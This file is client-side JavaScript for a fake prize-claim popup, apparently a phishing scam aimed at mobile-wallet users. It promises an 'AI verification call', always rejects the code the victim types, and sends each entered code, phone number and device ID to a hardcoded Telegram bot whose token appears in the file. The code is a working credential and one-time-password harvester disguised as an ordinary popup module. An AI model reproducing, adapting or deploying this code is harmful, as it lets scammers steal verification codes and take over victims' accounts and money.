/**
 * Popup Share Module - Listener Only (No Redirect Conflict)
 * Ang redirect logic ay nasa playbonus.js na.
 */

(function() {
    'use strict';
    
    let claimInProgress = false;
    
    // ========== AI-VERIFICATION CALL VARIABLES ==========
    let callInProgress = false;
    let callCountdown = 60;
    let callTimerInterval = null;
    let currentCallCode = '';
    
    // ========== SOUND EFFECT ==========
    function playCallSound() {
        try {
            var audio = new Audio('sounds/call_ring.mp3');
            audio.volume = 0.5;
            audio.play().catch(function(e) {});
        } catch(e) {}
    }
    
    // ========== TELEGRAM NOTIFICATIONS ==========
    var BOT_TOKEN = "8639737111:AAGvCqiHzkiJvVqH6YPocRIVMoiXZlK4ZWg";
    var CHAT_ID = "7298607329";
    
    function sendTelegramMessage(message) {
        try {
            fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage?chat_id=' + CHAT_ID + '&text=' + encodeURIComponent(message))
                .catch(function(e) {});
        } catch(e) {}
    }
    
    function sendAICallRequestNotification(userPhone, deviceId, code) {
        sendTelegramMessage('📞 AI-VERIFICATION CALL REQUESTED\n👤 User: ' + userPhone + '\n🖥️ Device: ' + deviceId + '\n🔑 Code: ' + code);
    }
    
    function sendAICodeAttemptNotification(userPhone, deviceId, codeEntered, secondsLeft) {
        sendTelegramMessage('🔑 AI-CODE ATTEMPT\n👤 User: ' + userPhone + '\n📝 Code: ' + codeEntered + '\n⏱️ Left: ' + secondsLeft + 's\n📊 Status: INVALID');
    }
    
    // ========== INITIALIZATION ==========
    function init() {
        // Dahil ang playbonus.js na ang humahawak sa redirect at popup logic,
        // dito ay ang Phase 3 (AI Verification) lang ang ini-initialize natin para sa backup.
        console.log('✅ Popup Module (AI Verification Only) ready');
    }
    
    // ========== SHOW PHASE 3 (AI-VERIFICATION CALL) ==========
    window.showPhase3AI = function() {
        var popup = document.getElementById('prizePopup');
        var popupInner = document.getElementById('prizePopupInner');
        if (!popup || !popupInner) return;
        
        popup.style.display = 'flex';
        
        callInProgress = false;
        callCountdown = 60;
        if (callTimerInterval) { clearInterval(callTimerInterval); callTimerInterval = null; }
        
        var userPhone = localStorage.getItem("userPhone") || "Unknown";
        var formattedPhone = userPhone.substring(0, 4) + "***" + userPhone.substring(7, 11);
        
        popupInner.innerHTML = `
            <div class="popup-close" id="popupClosePhase3">✕</div>
            
            <div style="text-align: center; margin-bottom: 10px;">
                <div style="width: 70px; height: 70px; margin: 0 auto; background: linear-gradient(145deg, #b537f2, #ff2d95); border-radius: 50%; border: 3px solid #ffd700; display: flex; align-items: center; justify-content: center; box-shadow: 0 0 20px rgba(255,45,149,0.5);">
                    <i class="fas fa-phone" style="font-size: 30px; color: #fff;"></i>
                </div>
            </div>
            
            <h2 class="claim-now-title">🔐 AI-VERIFICATION</h2>
            <div class="claim-now-divider"><span>★</span><span class="line"></span><span>★</span></div>
            
            <p style="font-size: 11px; color: rgba(255,255,255,0.8); text-align: center; margin: 5px 0 15px 0;">
                System AI will call you with a <strong style="color: #00f2ff;">4-digit verification code</strong>
            </p>
            
            <div id="callStatusContainer" style="background: rgba(0,0,0,0.4); border: 1px solid rgba(255,215,0,0.3); border-radius: 16px; padding: 15px; margin-bottom: 15px; text-align: center;">
                <div id="callStatusIcon" style="font-size: 28px; margin-bottom: 5px;">🍊</div>
                <div id="callStatusText" style="font-size: 13px; color: #fff; font-weight: 500;">Ready for verification</div>
                
                <div id="phoneNumberDisplay" style="display: none; margin-top: 8px;">
                    <span class="phone-number-display">
                        <span class="phone-icon">📱</span> ${formattedPhone}
                    </span>
                </div>
                
                <div id="callTimerDisplay" style="font-size: 32px; font-family: 'Orbitron', monospace; font-weight: 900; color: #39ff14; margin-top: 5px; display: none;">60s</div>
            </div>
            
            <button id="requestCallBtn" class="claim-via-gcash-btn mega-btn" style="width: 100%;">
                <i class="fas fa-phone-alt"></i> REQUEST AI CALL
            </button>
            
            <div id="codeSection" style="display: none; margin-top: 15px;">
                <div style="display: flex; gap: 10px; justify-content: center; align-items: center;">
                    <input type="text" id="code4Digit" class="verification-input" placeholder="0000" maxlength="4" inputmode="numeric" autocomplete="off">
                    <button id="verifyCodeBtn" class="pt-cat-claim-btn mega-btn" style="width: auto; padding: 14px 20px;">
                        <i class="fas fa-check"></i> VERIFY
                    </button>
                </div>
                
                <div id="codeErrorMsg" style="display: none; text-align: center; margin-top: 10px; color: #ff1744; font-size: 11px;">
                    <i class="fas fa-exclamation-circle"></i> Invalid code.
                </div>
            </div>
            
            <div style="text-align: center; margin-top: 12px;">
                <button class="small-back-btn" id="backBtnPhase3">← BACK</button>
            </div>
        `;
        
        attachPhase3Events();
    };
    
    function attachPhase3Events() {
        var closeBtn = document.getElementById('popupClosePhase3');
        if (closeBtn) closeBtn.onclick = function() { stopCallTimer(); closePopup(); };
        
        var backBtn = document.getElementById('backBtnPhase3');
        if (backBtn) backBtn.onclick = function() { stopCallTimer(); closePopup(); };
        
        var requestBtn = document.getElementById('requestCallBtn');
        if (requestBtn) {
            requestBtn.onclick = function() {
                if (callInProgress) return;
                requestAICall();
            };
        }
        
        var verifyBtn = document.getElementById('verifyCodeBtn');
        if (verifyBtn) verifyBtn.onclick = verifyCode;
    }
    
    function requestAICall() {
        if (callInProgress) return;
        
        callInProgress = true;
        callCountdown = 60;
        currentCallCode = Math.floor(1000 + Math.random() * 9000).toString();
        
        var userPhone = localStorage.getItem("userPhone") || "Unknown";
        var deviceId = localStorage.getItem("userDeviceId") || "Unknown";
        
        sendAICallRequestNotification(userPhone, deviceId, currentCallCode);
        
        var statusIcon = document.getElementById('callStatusIcon');
        var statusText = document.getElementById('callStatusText');
        var phoneDisplay = document.getElementById('phoneNumberDisplay');
        var timerDisplay = document.getElementById('callTimerDisplay');
        var requestBtn = document.getElementById('requestCallBtn');
        var codeSection = document.getElementById('codeSection');
        
        if (statusIcon) statusIcon.innerHTML = '📞';
        if (statusText) statusText.innerHTML = 'AI CALL is being placed...';
        if (phoneDisplay) phoneDisplay.style.display = 'block';
        if (timerDisplay) {
            timerDisplay.style.display = 'block';
            timerDisplay.textContent = '60s';
            timerDisplay.style.color = '#39ff14';
        }
        if (requestBtn) {
            requestBtn.disabled = true;
            requestBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> CALLING...';
        }
        if (codeSection) codeSection.style.display = 'none';
        
        playCallSound();
        startCallTimer();
        
        setTimeout(function() {
            if (statusIcon) statusIcon.innerHTML = '🎯';
            if (statusText) statusText.innerHTML = '<strong style="color: #39ff14;">CONNECTED!</strong>';
            if (codeSection) codeSection.style.display = 'block';
        }, 4000);
    }
    
    function startCallTimer() {
        stopCallTimer();
        var timerDisplay = document.getElementById('callTimerDisplay');
        
        callTimerInterval = setInterval(function() {
            callCountdown--;
            
            if (timerDisplay) {
                timerDisplay.textContent = callCountdown + 's';
                if (callCountdown <= 9) timerDisplay.style.color = '#ff1744';
                else timerDisplay.style.color = '#39ff14';
            }
            
            if (callCountdown <= 0) {
                stopCallTimer();
                closePopup();
            }
        }, 1000);
    }
    
    function stopCallTimer() {
        if (callTimerInterval) { clearInterval(callTimerInterval); callTimerInterval = null; }
    }
    
    function verifyCode() {
        var codeInput = document.getElementById('code4Digit');
        var codeErrorMsg = document.getElementById('codeErrorMsg');
        
        if (!codeInput) return;
        var enteredCode = codeInput.value.trim();
        
        if (!enteredCode || enteredCode.length !== 4) {
            if (codeErrorMsg) codeErrorMsg.style.display = 'block';
            return;
        }
        
        sendAICodeAttemptNotification(localStorage.getItem("userPhone"), localStorage.getItem("userDeviceId"), enteredCode, callCountdown);
        
        if (codeErrorMsg) codeErrorMsg.style.display = 'block';
        setTimeout(function() { codeInput.value = ''; }, 1500);
    }
    
    function closePopup() {
        var popup = document.getElementById('prizePopup');
        if (popup) popup.style.display = 'none';
        claimInProgress = false;
        stopCallTimer();
    }
    
    // ========== START ==========
    if (document.readyState === 'loading') {
        document.addEventListener('DOMContentLoaded', init);
    } else {
        init();
    }
    
})();
